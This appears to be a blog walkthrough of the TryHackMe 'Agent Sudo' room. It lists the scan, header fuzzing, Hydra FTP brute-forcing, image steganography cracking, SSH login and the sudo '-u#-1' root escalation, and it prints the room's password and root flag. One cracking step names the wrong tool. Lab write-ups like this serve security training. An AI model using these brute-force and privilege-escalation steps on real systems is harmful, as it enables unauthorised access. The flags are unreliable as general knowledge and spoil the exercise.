---
title: <img width="50" height="50" src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Frepository-images.githubusercontent.com%2F518509014%2Ff7450454-158c-45e0-8b38-0c0ae4d7394c&f=1&nofb=1&ipt=439e1f842390f9cf76eb01516d4b0b2ca0cd73decbe1b7e312c147dea4b1e64b&ipo=images"> AgentSudo | Tryhackme | Walkthrough 
date: 2023-12-12 07:00:02 +730
categories: [Write Up, TryHackMe]
tags: [agent-sudo,walkthrough,tryhackme,privilege-escalation,hydra,100-days-of-cybersecurity] # TAG names should always be lowercase


---
<h1 style="color: cyan; text-align: center">100 Day's Of Cybersecurity - Day 5</h1>

{: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }
# Agent Sudo | TryHackMe



## Nmap 

```
┌──(root㉿kali)-[/home/kali]
└─# nmap -sV -sC 10.10.69.110
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-14 01:02 EST
Nmap scan report for 10.10.69.110
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.57 seconds
```

So there are totally `3 ports are open` that is
`Ftp`
`ssh`
`http`

## HTTP - 80

there's two hint on the port number 80 
`user-agent`
`Agent R`

## Initial Foothold

 - Intercept the request 
 - send it to intruder
 - add user-agent field in sniper mode
 - in payload section keep `A` to `Z` 
 - start attack
 - look for changes in the response code

In the letter C you get this juicy information !   `http://10.10.97.21/agent_C_attention.php`  

```
Attention chris,
Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your g
od damn password, is weak!
From, Agent R
```

## FTP 

1️⃣ I tried FTP anonymous login but i failed
2️⃣ Bruteforcing
		 `hydra -l chris -P /usr/share/wordlist/rockyou.txt $IP ftp`


there were 3 files in total we download it by 
`mget *.*`

 - To_agentJ.txt
 - cutie.png
 - cute-alien.jpg


### 1️⃣ To_agentJ.txt

```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

### 2️⃣ cutie.png

-   `binwalk -e cutie.png`
-   `unzip cutie.png`

	 #### Zip file password

-   `ssh2john 8702.zip > 8702.hash`
-   `john 8702.hash --wordlist=/usr/share/seclists/Passwords/rockyou.txt`

### 3️⃣ cute-alien.png

-   `stegseek cute-alien.jpg /usr/share/seclists/passwords/rockyou.txt`

```
cat cute-alien.jpg.out 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
So we have james and hackerrules! as a password 

## SSH 

`ssh james@targetip`



## Privilege Escalation

```
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# cat /root/root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
root@agent-sudo:~# 
```

![](https://media.giphy.com/media/DAtJCG1t3im1G/giphy.gif)